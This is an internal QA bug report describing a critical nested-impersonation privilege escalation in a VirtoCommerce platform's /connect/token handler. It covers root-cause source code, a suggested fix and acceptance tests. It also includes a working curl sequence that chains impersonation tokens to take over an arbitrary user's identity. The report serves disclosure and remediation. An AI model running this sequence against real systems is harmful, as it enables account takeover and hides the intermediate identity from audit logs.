# BUG: Nested Impersonation via URL Bypasses CanImpersonate Permission Check

## Status: CONFIRMED

**Severity:** Critical
**Priority:** P0
**Component:** Auth / Impersonation / OpenIddict Permission Gate
**Browser:** Firefox (playwright-firefox) — bug is server-side; reproducible from any HTTP client
**Environment:** `https://vcst-qa.govirto.com` (vcst-qa)
**Platform Version:** 3.1026.0
**Theme Version:** `vc-theme-b2b-vue-2.49.0-pr-2280-8069-80690ef2` (PR #2280 — VCST-4906 feature build; bug is in the PLATFORM, not in PR #2280 directly)
**Module Versions:** `VirtoCommerce.Xapi 3.1007.0`, `VirtoCommerce.Customer 3.1007.0`, `VirtoCommerce.OpenIdConnectModule 3.1000.0`
**USER_EMAIL:** `.env` (`SUPPORT_AGENT_EMAIL` — USR-001 John Mitchell, has `CanImpersonate`)
**USER_PASSWORD:** `.env` (`SUPPORT_AGENT_PASSWORD`)
**Date:** 2026-05-14
**Reported By:** QA (Elena Mutykova, via TLC-2026-05-14-1400 lifecycle pipeline)
**Suite / Case:** `082-auth-impersonation.csv` / **IMP-013** (URL branch — distinct from the UI-dropdown branch which DOES correctly hide the action)
**Related JIRA:** **child of [VCST-4906](https://virtocommerce.atlassian.net/browse/VCST-4906)** — discovered while validating impersonation surface
**Related BL/ECL:** Violates **BL-AUTH-009** (no nested impersonation), **BL-AUTH-005** (impersonation gated by `CanImpersonate`), **ECL-14.1** (impersonation edge cases)

---

## Summary

The platform's `POST /connect/token grant_type=impersonate` handler in `AuthorizationController.cs::Exchange()` skips the `CanImpersonate` permission check when the caller's existing access token already carries an `OperatorUserId` claim (i.e. when the caller is currently impersonating someone). This was almost certainly intended to allow the *revert* flow (`user_id=""`) to succeed without re-checking permission — but the gate is overly broad: it also allows already-impersonated sessions to **issue further impersonation tokens for arbitrary targets**, including users in different orgs and users who themselves never had `CanImpersonate`.

The storefront UI gate at `/company/members` correctly hides the "Login on behalf" dropdown when the current session lacks `CanImpersonate` (verified in IMP-013 UI branch, screenshot `imp-013-impersonated-no-actions.png`). But because the storefront has the public route `/account/impersonate/{userId}` that auto-fires the silent flow for any authenticated session, the dropdown gate is bypassable just by typing the URL.

End result: A privilege-chain attack is possible. User A (with `CanImpersonate`) impersonates user B (no `CanImpersonate`). From B's session, A can pivot into user C's identity via direct URL navigation. The issued token carries `OperatorUserId=A`, but the request that produced it came from B's session — there is no audit linkage of A→B→C, and B's lack of `CanImpersonate` was never checked.

---

## Steps to Reproduce

### Setup

- Two same-org users for A→B leg: `SUPPORT_AGENT` (USR-001 John Mitchell, ACME, has `CanImpersonate`) → `IMPERSONATE_TARGET` (USR-003 Mike Torres, ACME, no `CanImpersonate`)
- A third user in any org for the B→C leg: `OTHER_ORG_USER` (USR-008 Carlos Rodriguez, BuildRight ORG-003) or any active customer with a security account

### Browser repro (Playwright Firefox)

1. Sign in to `{FRONT_URL}/sign-in` as **A = SUPPORT_AGENT** (USR-001). Password from `.env`.
2. Navigate to `{FRONT_URL}/company/members`. Click row dropdown for **B = Mike Torres (USR-003, same org, no CanImpersonate)** → "Login on behalf" → confirmation modal → OK.
3. Wait for silent flow. Header now shows **Mike Torres (B)**.
4. From B's impersonated session, navigate to `{FRONT_URL}/company/members`.
   - **Expected (per UI gate):** dropdown action column empty / "Login on behalf" not offered. ✅ This works — verified in IMP-013 UI branch.
5. **Now navigate by URL directly:** `{FRONT_URL}/account/impersonate/<userId-of-C>` (any active user — Carlos Rodriguez, David Kim, or any other security-account user). The `userId` GUID is visible in /company/members member-detail URLs, or can be pulled from JIRA admin, or guessed from a sequential range.
6. Wait for the silent flow.

### Expected

The silent flow MUST fail with 403 / "no permission". The current session (Mike Torres) does NOT have `CanImpersonate` — the impersonation request should be denied at `/connect/token`. No new token should be issued.

### Actual

The silent flow **succeeds**. A new access token is issued; header swaps to **Carlos Rodriguez (C)**. From this point onward, the chain A→B→C is fully active. The token's `OperatorUserId` claim is set to A (the original operator), so the JWT audit trail shows A→C — **B's role in the chain is erased**. B's lack of `CanImpersonate` was never verified.

### Repeat: B → D → E … chain depth is unbounded

Step 5 can be repeated indefinitely from any chained identity. Each hop simply re-uses the long-living `OperatorUserId=A` claim from the access token. There is no chain-depth limit, no audit of intermediate identities, no permission re-check.

### curl-only repro (bypasses the storefront entirely)

```bash
BACK="https://vcst-qa.govirto.com"

# 1. A obtains operator token (password grant) — must have CanImpersonate via role
A_TOKEN=$(curl -sk -X POST "$BACK/connect/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "grant_type=password&scope=offline_access&username=$A_EMAIL&password=$A_PASS&storeId=B2B-store" \
  | jq -r .access_token)

# 2. A impersonates B (legitimate — CanImpersonate is checked because OperatorUserId is empty)
B_TOKEN=$(curl -sk -X POST "$BACK/connect/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Authorization: Bearer $A_TOKEN" \
  --data "grant_type=impersonate&scope=offline_access&user_id=$B_USERID" \
  | jq -r .access_token)
# → 200; B_TOKEN issued; carries OperatorUserId=A

# 3. From B_TOKEN, impersonate C — CanImpersonate check SKIPPED because OperatorUserId=A is set
C_TOKEN=$(curl -sk -X POST "$BACK/connect/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Authorization: Bearer $B_TOKEN" \
  --data "grant_type=impersonate&scope=offline_access&user_id=$C_USERID" \
  | jq -r .access_token)
# → 200 ❌  (expected 403)

# 4. Verify C_TOKEN authenticates as C
curl -sk -X POST "$BACK/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $C_TOKEN" \
  --data '{"query":"{ me { id userName email } }"}'
# → 200, data.me.id = C
```

---

## Expected Result

Per **BL-AUTH-005** ("impersonation token grant requires CanImpersonate on the CURRENT session") and **BL-AUTH-009** ("no nested impersonation"), the platform MUST verify the current user's effective permission on EVERY impersonate grant, not only on the first one.

Acceptable contracts:
- **A — Always check CanImpersonate when `user_id != ""`:** Drop the `string.IsNullOrEmpty(OperatorUserId)` gate. Only the revert path (`user_id == ""`) is exempt from the permission check. Cleanest fix.
- **B — Verify the OPERATOR's permission, not the current session's:** When `OperatorUserId` is set, look up the operator from the claim and verify the operator (not the current impersonated user) still has `CanImpersonate`. Slightly more complex but allows the operator to retain a "session" of authorized impersonation power even after handing off to an impersonated identity. Note: still requires explicit re-check.
- **C — Reject `grant_type=impersonate` when caller is already impersonating (except for revert):** Strictest. Forces operators to revert before re-impersonating. Likely breaks existing UX flows (no evidence of any) but is the most defensible.

## Actual Result

The current session's permission is checked only when `OperatorUserId` is empty. Once the caller's token carries an `OperatorUserId` claim (i.e. they are already impersonating), the gate is bypassed. The handler proceeds straight to the impersonation logic for any `user_id` provided. **No fall-back check on the operator's current permissions, no chain audit, no depth limit.**

---

## Evidence

All artifacts under `reports/test-lifecycle/TLC-2026-05-14-1400/phase-5-evidence/`:

| File | Content |
|------|---------|
| `imp-013-impersonated-no-actions.png` | UI gate working — impersonated user (no `CanImpersonate`) sees `/company/members` with empty action column. Storefront-layer gate is correct. |
| `imp-013-nested-impersonation-broken.png` | URL-flow bypass — same impersonated session navigates to `/account/impersonate/{C-userId}` directly → silent flow fires → header swaps to C. Server-layer gate fails. |
| (planned) curl trace | Same scenario reproduced via curl in 4 requests; recommend running and attaching before JIRA file |

---

## Layer Validation

| Layer | Result | Evidence |
|---|---|---|
| 1. Storefront Frontend | **PASS** (UI gate) / **FAIL** (URL flow) | `imp-013-impersonated-no-actions.png` confirms the dropdown gate hides the action correctly; `imp-013-nested-impersonation-broken.png` confirms the public top-level route `/account/impersonate/:userId` (introduced in VCST-4905 PR #2279) is reachable regardless of current-session permission — relies on backend gate that's missing |
| 2. Backend Admin (Admin SPA) | **N/A** | Impersonation tokens are issued via `/connect/token`, not via Admin SPA endpoints |
| 3. GraphQL xAPI | **N/A** | xAPI just consumes the issued JWT; would inherit any token, no gate of its own |
| 4. Platform REST API | **FAIL** | `POST /connect/token grant_type=impersonate` returns 200 + new token when called from an already-impersonated session (OperatorUserId claim set), without re-checking CanImpersonate. **This is the owning layer.** |

**Owning layer:** **Layer 4 (Platform).** Fix is one localized change in `AuthorizationController.cs::Exchange()` `IsImpersonateGrantType` branch.

---

## Root Cause Analysis

### Source code evidence

File: [`src/VirtoCommerce.Platform.Web/Controllers/Api/AuthorizationController.cs`](https://github.com/VirtoCommerce/vc-platform/blob/dev/src/VirtoCommerce.Platform.Web/Controllers/Api/AuthorizationController.cs) on branch `dev` (sha `67ff599`).

In the `Exchange()` method, `IsImpersonateGrantType` branch:

```csharp
if (openIdConnectRequest.IsImpersonateGrantType())
{
    // Only Authorized User has access for impersonation
    var user = await _userManager.GetUserAsync(User);
    if (user == null) { return Unauthorized(); }

    // Check if user has permission for login on behalf
    if (string.IsNullOrEmpty(User.FindFirstValue(PlatformConstants.Security.Claims.OperatorUserId)))
    {                                                              // ← THE BUG: only checks on first hop
        var loginOnBehalfAuthResult = await _authorizationService.AuthorizeAsync(User, null,
            new PermissionAuthorizationRequirement(PlatformConstants.Security.Permissions.SecurityLoginOnBehalf));
        if (!loginOnBehalfAuthResult.Succeeded) { return Forbid(); }
    }

    // Resolve Impersonator from claims or from current user
    var operatorUserId = User.FindFirstValue(PlatformConstants.Security.Claims.OperatorUserId)?.EmptyToNull() ?? user.Id;
    var operatorUserName = User.FindFirstValue(PlatformConstants.Security.Claims.OperatorUserName)?.EmptyToNull() ?? user.UserName;

    var userId = (string)openIdConnectRequest.GetParameter("user_id");
    ApplicationUser impersonatedUser;

    if (!string.IsNullOrEmpty(userId))
    {
        // Find impersonated user by id
        impersonatedUser = await _userManager.FindByIdAsync(userId);   // ← any userId accepted, no gate
    }
    else
    {
        // Reset impersonation to operator (revert path)
        impersonatedUser = await _userManager.FindByIdAsync(operatorUserId);
        operatorUserId = string.Empty;
        operatorUserName = string.Empty;
    }
    ...
```

**Key observation:** The `if (string.IsNullOrEmpty(OperatorUserId))` guard wraps the permission check. The likely intent was: "if this is a revert call (within an impersonation session), don't re-check permission". But the guard fires for ANY call from an impersonation session, **including new-target impersonations** (`user_id != ""`).

The handler does not differentiate between:
1. **Revert** (`user_id == ""`) — should bypass permission check ✅ (intended)
2. **Re-target** (`user_id != ""` from impersonated session) — should ALSO check permission ❌ (currently bypassed)

### Why the storefront UI doesn't catch it

VCST-4905 PR #2279 introduced `/account/impersonate/:userId` as a **public top-level route** (not nested under `accountRoutes`) — this allows the operator's storefront tab to receive the route directly from admin SPA after cross-origin click. The route auto-fires the silent flow (`useImpersonate.impersonateAuthenticated`) without any storefront-side `CanImpersonate` check — it relies entirely on the backend gate. The frontend's `/company/members` dropdown gate works correctly, but it's a UX guard, not a security guard. The security check belongs (and currently fails) at the backend.

### Why this matters for VCST-4906 specifically

PR #2280 (VCST-4906) introduces /company/members entry point with the `CanImpersonate` UI gate. But because the URL route remains publicly accessible (no auth guard requiring `CanImpersonate`), the dropdown gate alone is not load-bearing. **Any code that thinks "I hid the button so the user can't reach the feature" is wrong if the underlying route is still hittable.**

### Recent changes

The `IsImpersonateGrantType` branch is not new — it was added with the initial impersonation feature (VCST-4903 epic, predates the deploy diff captured at `reports/full-cycle/last-deploy-state.json`). The `string.IsNullOrEmpty(OperatorUserId)` guard appears to be a long-standing intentional design that was correct under the old admin-only entry-point assumption but is exposed by VCST-4905/4906's new storefront entry points.

### Application Insights (vcst-qa) — TODO

Recommend post-filing query against `vcst-qa` AI for `Forbid` results from `/connect/token grant_type=impersonate` requests in the last 30 days. A low number (zero would be ideal) confirms no production user has ever been denied — meaning either (a) no users without `CanImpersonate` have tried, OR (b) the gate has been bypassable for as long as the code has existed. Either way, this is the time to fix it.

---

## Suggested Fix

**Single-file change** in `AuthorizationController.cs`. Move the permission check OUTSIDE the `OperatorUserId` guard, and gate it on whether the request is a revert:

```csharp
if (openIdConnectRequest.IsImpersonateGrantType())
{
    var user = await _userManager.GetUserAsync(User);
    if (user == null) { return Unauthorized(); }

    var userId = (string)openIdConnectRequest.GetParameter("user_id");
    var isRevert = string.IsNullOrEmpty(userId);

    // Permission check: always required UNLESS this is a revert call from an already-impersonated session.
    if (!isRevert)
    {
        // For non-revert calls (new target), always verify CanImpersonate on the current session.
        // Special handling: if the caller is already impersonating, verify the ORIGINAL operator's permission,
        // not the impersonated user's. (Option B in the bug report.)
        var operatorUserIdClaim = User.FindFirstValue(PlatformConstants.Security.Claims.OperatorUserId);
        ClaimsPrincipal principalToCheck = User;

        if (!string.IsNullOrEmpty(operatorUserIdClaim))
        {
            // Reconstruct the operator's principal for the permission check
            var operatorUser = await _userManager.FindByIdAsync(operatorUserIdClaim);
            if (operatorUser == null)
            {
                return Forbid();   // operator no longer exists — refuse
            }
            principalToCheck = await _signInManager.CreateUserPrincipalAsync(operatorUser);
        }

        var loginOnBehalfAuthResult = await _authorizationService.AuthorizeAsync(principalToCheck, null,
            new PermissionAuthorizationRequirement(PlatformConstants.Security.Permissions.SecurityLoginOnBehalf));
        if (!loginOnBehalfAuthResult.Succeeded) { return Forbid(); }
    }

    // ... rest of the handler unchanged
}
```

Alternative simpler fix (Option A from "Expected Result"): always check `User` (the current session) regardless of impersonation state. Forces the operator-restoration flow (revert) to skip the check via the `isRevert` early-exit only. Simpler but assumes the current-session-user's permission is the right thing to check — which is wrong when the current session IS an impersonated user.

**Recommendation:** Option B (verify operator's permission via claim lookup), because:
- The operator may have had their `CanImpersonate` permission revoked while impersonating; this fix surfaces that
- It preserves the audit trail principle (operator is the actual principal of impersonation power)
- The implementation cost is one extra `_userManager.FindByIdAsync` per impersonate-grant call from an impersonated session — negligible

### Defense-in-depth (storefront)

In addition to the backend fix, consider adding a route guard on `/account/impersonate/:userId` in vc-frontend that:
- Requires authentication
- If the current user has `OperatorUserId` claim set AND the current request is for a NEW target (not revert), checks `CanImpersonate` on the operator
- Redirects to home with an error notification if the check fails

This is defense-in-depth: if the backend check is ever re-broken in the future, the storefront still gates the URL.

---

## Acceptance Criteria for Fix Verification

When the fix ships, re-run `IMP-013` URL branch (already in suite 082):

- [ ] A→B impersonation succeeds (legitimate first hop)
- [ ] From B's session, `POST /connect/token grant_type=impersonate user_id=$C` returns **HTTP 403 Forbidden** (B does not have `CanImpersonate`)
- [ ] From B's session, `POST /connect/token grant_type=impersonate user_id=` (empty, revert) returns **HTTP 200** with a token whose subject is A (revert path still works)
- [ ] If A's role is changed to remove `CanImpersonate` while A is impersonating B, subsequent attempts to re-target from B's session must also return **HTTP 403** (verifies the operator-permission re-lookup works)
- [ ] Storefront `/account/impersonate/:userId` (when impersonated session lacks the operator's permission) shows the same error UI as a 403 from `/connect/token` (no half-completed silent flow leaving the user in a strange state)
- [ ] BL-AUTH-005 / BL-AUTH-009 invariants pass against the live env (re-verify with `IMP-013`, `IMP-036` (RBAC negative form flow), `IMP-037` (RBAC negative silent flow))

---

## References

- **JIRA Parent:** [VCST-4906](https://virtocommerce.atlassian.net/browse/VCST-4906); epic [VCST-4903](https://virtocommerce.atlassian.net/browse/VCST-4903) "Login on behalf"
- **PRs affecting impersonation entry surface:**
  - [VirtoCommerce/vc-frontend#2279](https://github.com/VirtoCommerce/vc-frontend/pull/2279) (VCST-4905, MERGED) — introduced the public top-level `/account/impersonate/:userId` route that exposes this defect
  - [VirtoCommerce/vc-frontend#2280](https://github.com/VirtoCommerce/vc-frontend/pull/2280) (VCST-4906, OPEN) — adds the /company/members entry-point UI gate that would benefit from this fix being in place
- **Test cases:**
  - `regression/suites/Frontend/auth/082-auth-impersonation.csv` — IMP-013 "Impersonated User Cannot Initiate Further Impersonation (Nested)" — URL branch
  - IMP-036 (RBAC negative Form Flow) and IMP-037 (RBAC negative Silent Flow) — verify the permission gate from the unauthenticated/unprivileged side
- **Source files (verified 2026-05-14):**
  - `vc-platform/src/VirtoCommerce.Platform.Web/Controllers/Api/AuthorizationController.cs` @ branch `dev` (sha `67ff599`) — `Exchange()` `IsImpersonateGrantType` branch
  - `vc-frontend/client-app/shared/account/composables/useImpersonate.ts` @ branch `feat/VCST-4906-login-on-behalf` (sha `413bf48`) — `impersonateAuthenticated()` silent-flow entry
- **Business logic / edge cases:**
  - `BL-AUTH-005` — Impersonation gated by `CanImpersonate`
  - `BL-AUTH-009` — No nested impersonation
  - `ECL-14.1` — Impersonation edge cases
- **Memory references:**
  - `reference_impersonation_permission_naming` — Admin SPA key `platform:security:loginOnBehalf` ≡ code-side `CanImpersonate` / `StorefrontPermissions.CanImpersonate`
  - `feedback_admin_permissions_via_roles` — Permissions live on Roles, not directly on users
- **Lifecycle report:** `reports/test-lifecycle/TLC-2026-05-14-1400/lifecycle-report.md` (Verdict: NEEDS FIXES; G8 FAIL)
